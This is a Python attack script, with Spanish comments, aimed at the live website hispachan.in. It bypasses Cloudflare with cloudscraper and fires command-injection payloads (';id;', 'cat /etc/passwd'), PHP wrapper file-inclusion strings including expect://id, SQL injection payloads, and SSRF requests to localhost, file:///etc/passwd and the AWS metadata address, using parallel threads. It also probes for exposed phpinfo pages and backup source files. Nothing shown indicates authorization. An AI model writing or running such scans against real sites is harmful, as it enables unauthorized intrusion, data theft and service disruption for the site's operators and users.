#!/usr/bin/env python3
import cloudscraper
import requests
from bs4 import BeautifulSoup
import re
import json
import time
from urllib.parse import urljoin, urlparse, quote
import concurrent.futures
import threading

class AggressiveScanner:
    def __init__(self):
        self.base_url = "https://hispachan.in/"
        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        self.vulnerabilities = []
        self.lock = threading.Lock()
        
        # Cargar URLs del análisis previo
        with open('/workspace/hispachan_analysis.json', 'r') as f:
            data = json.load(f)
            self.urls = data['discovered_urls']
            self.forms = data['forms']
    
    def test_php_vulnerabilities(self, url):
        """Probar vulnerabilidades específicas de PHP"""
        vulns_found = []
        
        # 1. PHP Info Disclosure
        info_paths = [
            'phpinfo.php', 'info.php', 'test.php', 'php.php',
            '_phpinfo.php', 'i.php', 'asdf.php', 'pinfo.php'
        ]
        
        base = url.rsplit('/', 1)[0] + '/'
        for path in info_paths:
            test_url = base + path
            try:
                resp = self.scraper.get(test_url, timeout=3)
                if resp.status_code == 200 and 'phpinfo()' in resp.text:
                    vulns_found.append({
                        'type': 'PHP Info Disclosure',
                        'url': test_url,
                        'severity': 'HIGH'
                    })
                    print(f"[!!!] PHP Info encontrado: {test_url}")
            except:
                pass
        
        # 2. Backup files
        if url.endswith('.php'):
            backup_extensions = [
                '.bak', '.backup', '.old', '.orig', '~', '.save',
                '.swp', '.tmp', '.temp', '.copy', '.1'
            ]
            
            for ext in backup_extensions:
                test_url = url + ext
                try:
                    resp = self.scraper.get(test_url, timeout=3)
                    if resp.status_code == 200 and '<?php' in resp.text:
                        vulns_found.append({
                            'type': 'Source Code Disclosure',
                            'url': test_url,
                            'severity': 'CRITICAL'
                        })
                        print(f"[!!!] Código fuente expuesto: {test_url}")
                except:
                    pass
        
        # 3. Command Injection
        if '?' in url:
            base, params = url.split('?', 1)
            cmd_payloads = [
                ';id;', '|id|', '`id`', '$(id)', ';cat /etc/passwd;',
                '|cat /etc/passwd|', '`cat /etc/passwd`'
            ]
            
            for payload in cmd_payloads:
                test_url = f"{base}?{params}&cmd={quote(payload)}"
                try:
                    resp = self.scraper.get(test_url, timeout=3)
                    if any(indicator in resp.text for indicator in ['uid=', 'gid=', 'groups=', 'root:']):
                        vulns_found.append({
                            'type': 'Command Injection',
                            'url': test_url,
                            'severity': 'CRITICAL'
                        })
                        print(f"[!!!] Command Injection: {test_url}")
                        break
                except:
                    pass
        
        # 4. PHP Wrappers
        if '?' in url:
            base, params = url.split('?', 1)
            wrapper_payloads = [
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'php://input',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
                'expect://id',
                'php://filter/convert.base64-encode/resource=../../../etc/passwd'
            ]
            
            # Buscar parámetros que puedan ser vulnerables
            param_names = re.findall(r'([^&=]+)=', params)
            
            for param in param_names:
                for payload in wrapper_payloads:
                    test_url = f"{base}?{param}={quote(payload)}"
                    try:
                        resp = self.scraper.get(test_url, timeout=3)
                        
                        # Verificar respuesta base64
                        if 'PD9waHA' in resp.text or 'cm9vdDo' in resp.text:
                            vulns_found.append({
                                'type': 'PHP Wrapper LFI',
                                'url': test_url,
                                'param': param,
                                'severity': 'HIGH'
                            })
                            print(f"[!!!] PHP Wrapper LFI: {test_url}")
                            break
                    except:
                        pass
        
        # 5. File Upload vulnerabilities
        if any(keyword in url for keyword in ['upload', 'file', 'image', 'media', 'attach']):
            vulns_found.append({
                'type': 'Potential File Upload',
                'url': url,
                'severity': 'MEDIUM',
                'note': 'Requires manual testing'
            })
        
        return vulns_found
    
    def test_advanced_sqli(self, url):
        """Pruebas avanzadas de SQL Injection"""
        vulns_found = []
        
        if '?' not in url:
            return vulns_found
        
        base, params = url.split('?', 1)
        
        # Payloads más sofisticados
        sqli_payloads = [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT database(),user(),version()--",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1' AND extractvalue(1,concat(0x7e,database()))--"
        ]
        
        param_names = re.findall(r'([^&=]+)=', params)
        
        for param in param_names:
            for payload in sqli_payloads:
                test_url = f"{base}?{param}={quote(payload)}"
                
                try:
                    start_time = time.time()
                    resp = self.scraper.get(test_url, timeout=10)
                    elapsed = time.time() - start_time
                    
                    # Time-based detection
                    if elapsed > 4.5 and 'SLEEP' in payload:
                        vulns_found.append({
                            'type': 'Time-based SQL Injection',
                            'url': test_url,
                            'param': param,
                            'severity': 'CRITICAL'
                        })
                        print(f"[!!!] Time-based SQLi: {test_url}")
                        break
                    
                    # Error-based detection
                    error_patterns = [
                        r'mysql_fetch',
                        r'Warning.*mysql',
                        r'SQL syntax',
                        r'MySQLSyntaxErrorException',
                        r'valid MySQL result',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*\Wmysqli?_',
                        r'MySQLSyntaxErrorException',
                        r'valid PostgreSQL result',
                        r'mssql_query\(\)',
                        r'Driver.*SQL.*Server',
                        r'OLE DB.*SQL Server',
                        r'SQLServer JDBC Driver',
                        r'SqlException',
                        r'Syntax error.*in query expression'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            vulns_found.append({
                                'type': 'Error-based SQL Injection',
                                'url': test_url,
                                'param': param,
                                'error': pattern,
                                'severity': 'HIGH'
                            })
                            print(f"[!!!] Error-based SQLi: {test_url}")
                            break
                    
                except Exception as e:
                    pass
        
        return vulns_found
    
    def test_ssrf(self, url):
        """Probar Server-Side Request Forgery"""
        vulns_found = []
        
        if '?' not in url:
            return vulns_found
        
        base, params = url.split('?', 1)
        
        ssrf_payloads = [
            'http://localhost:80',
            'http://127.0.0.1:80',
            'http://169.254.169.254/',  # AWS metadata
            'file:///etc/passwd',
            'gopher://127.0.0.1:80',
            'dict://127.0.0.1:80',
            'ftp://127.0.0.1:21',
            'http://[::1]:80'
        ]
        
        param_names = re.findall(r'([^&=]+)=', params)
        
        for param in param_names:
            # Skip si el parámetro parece numérico
            if param in ['id', 'page', 'p', 'cat']:
                continue
                
            for payload in ssrf_payloads:
                test_url = f"{base}?{param}={quote(payload)}"
                
                try:
                    resp = self.scraper.get(test_url, timeout=5)
                    
                    # Buscar indicadores de SSRF
                    if any(indicator in resp.text for indicator in 
                           ['root:', 'Apache', 'nginx', 'Microsoft-IIS', 
                            'ami-id', 'instance-id', 'local-ipv4']):
                        vulns_found.append({
                            'type': 'SSRF',
                            'url': test_url,
                            'param': param,
                            'severity': 'HIGH'
                        })
                        print(f"[!!!] SSRF encontrado: {test_url}")
                        break
                except:
                    pass
        
        return vulns_found
    
    def scan_url(self, url):
        """Escanear una URL individual"""
        all_vulns = []
        
        # Solo escanear URLs PHP
        if '.php' in url or '?' in url:
            all_vulns.extend(self.test_php_vulnerabilities(url))
            all_vulns.extend(self.test_advanced_sqli(url))
            all_vulns.extend(self.test_ssrf(url))
        
        # Guardar resultados
        with self.lock:
            self.vulnerabilities.extend(all_vulns)
    
    def run_aggressive_scan(self):
        """Ejecutar escaneo agresivo en paralelo"""
        print("[*] Iniciando escaneo agresivo...")
        print(f"[*] Total de URLs a escanear: {len(self.urls)}")
        
        # Filtrar solo URLs interesantes
        interesting_urls = [url for url in self.urls if '.php' in url or '?' in url]
        print(f"[*] URLs interesantes (PHP/params): {len(interesting_urls)}")
        
        # Escanear en paralelo
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for url in interesting_urls:
                future = executor.submit(self.scan_url, url)
                futures.append(future)
            
            # Esperar a que terminen
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                print(f"\r[*] Progreso: {i+1}/{len(interesting_urls)}", end='')
        
        print("\n\n[+] Escaneo completo!")
        
        # Guardar resultados
        with open('/workspace/aggressive_scan_results.json', 'w') as f:
            json.dump({
                'vulnerabilities': self.vulnerabilities,
                'total_found': len(self.vulnerabilities),
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
            }, f, indent=2)
        
        print(f"[+] Total de vulnerabilidades encontradas: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\n[!] Resumen de vulnerabilidades críticas:")
            critical_vulns = [v for v in self.vulnerabilities if v.get('severity') in ['CRITICAL', 'HIGH']]
            
            for vuln in critical_vulns[:10]:  # Mostrar las primeras 10
                print(f"\n  Type: {vuln['type']}")
                print(f"  URL: {vuln['url']}")
                print(f"  Severity: {vuln['severity']}")

if __name__ == "__main__":
    scanner = AggressiveScanner()
    scanner.run_aggressive_scan()